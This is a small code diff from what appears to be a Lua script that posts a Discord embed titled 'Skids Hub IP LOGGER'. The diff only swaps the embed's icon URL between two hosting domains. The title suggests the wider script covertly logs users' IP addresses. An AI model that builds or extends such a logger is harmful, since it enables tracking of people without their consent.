@@ -25,7 +25,7 @@ do
                         author={
                                 name='Skids Hub/ramirez',
                                 url='https://discord.gg/q8FspVseAU',
-                                icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
+                                icon_url='https://sweetiefoxislife.000webhostapp.com/media/skids_HUB.png'
                         },
                         title='Skids Hub **IP LOGGER**',
                         url='https://discord.gg/q8FspVseAU',
@@ -73,7 +73,7 @@ do
                         },
                         footer = {
                             text = 'Skids Hub',
-                            icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
+                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/skids_HUB.png'
                         }
                     }
                 }
